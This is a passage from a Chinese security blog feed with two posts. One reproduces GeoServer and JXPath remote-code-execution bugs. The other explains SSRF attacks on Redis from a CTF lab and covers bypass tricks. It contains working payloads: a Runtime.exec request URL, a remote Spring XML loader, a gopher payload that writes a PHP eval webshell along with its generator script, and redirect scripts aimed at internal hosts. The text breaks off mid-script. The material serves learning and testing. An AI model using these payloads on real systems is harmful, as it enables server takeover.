href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：</p><p><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：</p><p><a href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220637144.png" alt="image-20250109220637144"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220231306.png" alt="image-20250109220231306"></p><p>从官方的通报中可以注意到，若XPath表达式由用户输入提供，则会出现安全问题。存在安全问题的接口为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</span><br><span class="line">org.geotools.data.complex.expression.MapPropertyAccessorFactory.<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</span><br></pre></td></tr></table></figure><p>测试样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.geotools.xsd.StreamingParser(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.geotools.filter.v1_0.OGCConfiguration(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(<span class="string">&quot;&lt;Filter&gt;&lt;/Filter&gt;&quot;</span>.getBytes()),</span><br><span class="line">                <span class="string">&quot;java.lang.Thread.sleep(5000)&quot;</span>)</span><br><span class="line">        .parse();</span><br></pre></td></tr></table></figure><h3 id="漏洞复现">漏洞复现</h3><p>若用户输入的参数，传输到了这些存在漏洞的类中，参数会经过JXPath引擎去进行解析，从而导致代码执行。漏洞本质是JXPath漏洞，JXpath漏洞是Apache Commons JXPath之前爆出的漏洞（CVE-2022-41852），这个JXPath对传统的XPath语句进行了拓展，支持XPath语句中插入一些表达式语言的特性，能够调用任意public的静态方法等导致任意代码执行。</p><p>官网给出的可能存在漏洞的请求</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WFS GetFeature</span><br><span class="line">WFS GetPropertyValue</span><br><span class="line">WMS GetMap</span><br><span class="line">WMS GetFeatureInfo</span><br><span class="line">WMS GetLegendGraphic</span><br><span class="line">WPS Execut</span><br></pre></td></tr></table></figure><p>查询官网</p><p><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a></p><p>WFS GetPropertyValue请求如下：</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222248139.png" alt="image-20250109222248139"></p><p>GET请求即可触发漏洞：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),%27touch%20/tmp/success2%27)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222510886.png" alt="image-20250109222510886"></p><h3 id="定位漏洞">定位漏洞</h3><p>由前面可知，GetPropertyValue是我们要定位的位置，找到类的位置。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223053220.png" alt="image-20250109223053220"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223140901.png" alt></p><p>对run方法进行断点，进行单步调试，定位到代码propertyNameNoIndexes.evaluate处，这里调用了geotool的evaluate方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223804405.png" alt="image-20250109223804405"></p><p>发现org.geotools.filter.AttributeExpressionImpl#evaluate(java.lang.Object, java.lang.Class<T>)中调用了accessor.get，再跟进</T></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225119903.png" alt="image-20250109225119903"></p><p>这里调用了存在漏洞的<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get</code>触发了漏洞。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225403954.png" alt="image-20250109225403954"></p><h3 id="CVE-2022-41852-XPath漏洞">CVE-2022-41852 XPath漏洞</h3><h4 id="漏洞描述">漏洞描述</h4><p>Apache Commons JXPath安全漏洞，攻击者可以利用除compile()和compilePath()函数之外的所有处理XPath字符串的JXPathContext等函数通过XPath表达式从类路径加载任何Java类，从而执行恶意代码。</p><p>JXPath及用法：</p><p><a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html">https://commons.apache.org/proper/commons-jxpath/users-guide.html</a></p><h4 id="利用范围">利用范围</h4><p>Apache Commons JXPath &lt;= 1.3</p><h4 id="漏洞复现-2">漏洞复现</h4><p>下载POC：<a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p><p>POC使用Spring框架，简单实现接受用户输入并使用它从Person类中检索指定的数据。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110115215618.png" alt="image-20250110115215618"></p><p>启动Spring，在本地创建一个test.xml，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;commandRunner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地再开启一个80端口，用于远程加载test.xml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/vulnerable-example?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1/test.xml%22)</span><br></pre></td></tr></table></figure><p>开启调试，断点，调用了org.apache.commons.jxpath.JXPathContext#getValue(java.lang.String)方法，跟进</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130016519.png" alt="image-20250110130016519"></p><p>跟进org.apache.commons.jxpath.ri.compiler.Expression#computeValue</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130144114.png" alt="image-20250110130144114"></p><p>继续跟进到org.apache.commons.jxpath.Function#invoke函数中，实现了Spring-Bean加载，执行恶意代码。</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130533234.png" alt="image-20250110130533234"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110131339598.png" alt="image-20250110131339598"></p><h2 id="参考">参考</h2><p>CVE-2024-36401参考：</p><p><a href="https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md</a></p><p><a href="https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a">https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a</a></p><p><a href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></p><p>CVE-2022-41852参考：</p><p><a href="https://www.anquanke.com/post/id/281941">https://www.anquanke.com/post/id/281941</a></p><p><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Java </tag>
            
            <tag> XPath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞篇</title>
      <link href="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
      <url>/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF打Redis">SSRF打Redis</h2><p>CTF show的WEB入门360关卡，打Redis。</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现6379端口开放，6379端口，一般为Redis。</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/1.png" alt></p><p>打入Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25245%250D%250A1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure><p>成功。</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/2.png" alt></p><h3 id="使用到了gopher协议">使用到了gopher协议</h3><blockquote><p>Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，当然现在 Gopher 协议已经慢慢淡出历史。<br>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。</p></blockquote><p>特定的协议开头，“_”后面跟着内容部分。</p><p><code>gopher://127.0.0.1:6379/_</code></p><h3 id="Redis的语法">Redis的语法</h3><p>上述使用的Payload是基于存在Redis未授权漏洞的情况下，无需密码，下面我们来简单分析一下使用的payload。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5</span></span><br><span class="line">1.php</span><br><span class="line">*1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>*3</code>指的是三个变量，<code>$3</code>指的是字符的长度为3。</p><p>正常我们使用Redis的语法，首先需要进行登录，存在未授权可直接登录，不存在则需要密码登录。</p><p><code>redis-cli -h 192.168.73.150 -a password</code></p><p>上传Webshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &lt;?php$&#123;IFS&#125;eval($_POST[1]);?&gt;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>注意</strong></em>：我注意到很多打CTF的同学使用的<code>Gopherus</code>去生成的payload，我发现<code>Gopherus</code>在生成payload时，使用到了<code>flushall</code>命令，该命令用于清空 Redis 服务器中的所有数据库，数据会被永久删除，切记不可用于实际环境中！</p></blockquote><p>网上翻到的脚本，实测可行，SSRF打Redis的redis_shell.py如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span class="comment">#shell</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php eval($_POST[1]);?&gt;\n\n&quot;</span></span><br><span class="line"><span class="comment">#文件名</span></span><br><span class="line">filename=<span class="string">&quot;1.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"><span class="comment">#redis密码</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[</span><br><span class="line">    <span class="comment">#&quot;auth passwd&quot;,</span></span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):</span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x))</span><br><span class="line">    <span class="comment">#最后的结果要对&quot;_&quot;后面进行一次url编码</span></span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="⚠️注意点">⚠️注意点</h3><p>在使用SSRF打Redis时，对于&quot;gopher://127.0.0.1:6379/_&quot;后的内容需要进行一次url编码。</p><h2 id="SSRF的绕过">SSRF的绕过</h2><p>学习SSRF不能仅仅局限于CTF比赛中，更多的是要运用在实际的环境中。</p><h3 id="绕过URL匹配字符的限制">绕过URL匹配字符的限制</h3><p><strong>后端对请求的URL进行字符匹配检测。</strong></p><p>下面，<code>evil.com</code>为恶意的域名，<code>target.com</code>为正常的业务域名。</p><p>例如，直接判断URL中是否包含某个<code>target.com</code>。使用@进行绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com@evil.com</span><br></pre></td></tr></table></figure><p>例如，使用字符串匹配的方式，判断域名中是否存在某个子域名，如必须包含<code>qq.com</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com.evil.com</span><br></pre></td></tr></table></figure><p><strong>解析的差异。</strong></p><p>例如，前后端分离，对URL的解析差异不同，绕过检测。有的后端会把<code>\.</code>和<code>\@</code>解析成<code>.</code>和<code>@</code>，则会解析到<code>evil.com</code>。若把<code>\</code>解析为<code>/</code>，则不存在问题，还是正常解析到<code>target.com</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target.com\.evil.com</span><br><span class="line">https://target.com\@evil.com</span><br></pre></td></tr></table></figure><h3 id="直接302跳转">直接302跳转</h3><p>利用302跳转，跳转到内网的地址上，实现<code>SSRF</code>。</p><p>使用<code>php</code>代码实现，<code>302.php</code>如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="有条件的302跳转">有条件的302跳转</h3><p>要考虑实际环境中是否有相关的过滤。我自己想到的过滤有以下几种，具体要根据实际情况分析。</p><h4 id="1-、后端验证了跳转的目标域名">(1)、后端验证了跳转的目标域名</h4><p>后端代码验证了跳转的目标URL的域名，是否为白名单中的域名。绕过这种验证，需要找到白名单域名中的一个302跳转，即可实现绕过。</p><p>自己的服务器上部署<code>r.php</code>，对应的URL为<code>https://evil.com/r.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 设置跳转目标内网URL</span></span><br><span class="line">    <span class="variable">$target_url</span>=<span class="string">&#x27;http://127.0.0.1/&#x27;</span>;</span><br><span class="line">    <span class="comment">// 发送302跳转头信息</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$target_url</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在302跳转的白名单域名，如下：</p><p><code>https://vulnerable.com/?redirect_url=</code></p><p>则跳转的地址为：</p><p><code>https://vulnerable.com/?redirect_url=https%3A%2F%2Fevil.com%2Fr.php</code></p><p><code>vulnerable.com</code>为白名单域名，绕过了白名单的限制。</p><h4 id="2-、后端验证了请求返回的数据包">(2)、后端验证了请求返回的数据包</h4><p>后端代码对请求的URL的返回结果进行了验证。返回的响应数据包中的每一个内容都有可能作为后端限制的条件，这里绕过限制的方法就是去想办法构造，满足后端代码的判断条件，然后再进行302的跳转。</p><p><strong>例如</strong>，即后端验证请求的URL返回的状态码只能是特定的，如200。此时要在使用dnslog进行<code>SSRF</code>测试的时候注意，后端代码对URL进行了几次请求，有可能的情况是先对URL请求一次验证状态码是200，满足条件后，后续几次请求未对返回内容进行验证。此时我们可以编写代码，进行请求次数的限定，第一次请求返回200，第n次请求返回302跳转，跳转到内网的地址中。</p><p>使用<code>nodejs</code>实现<code>ssrf.js</code>，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> requestCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/1&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    requestCount++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> personalInfo = &#123;</span><br><span class="line">        <span 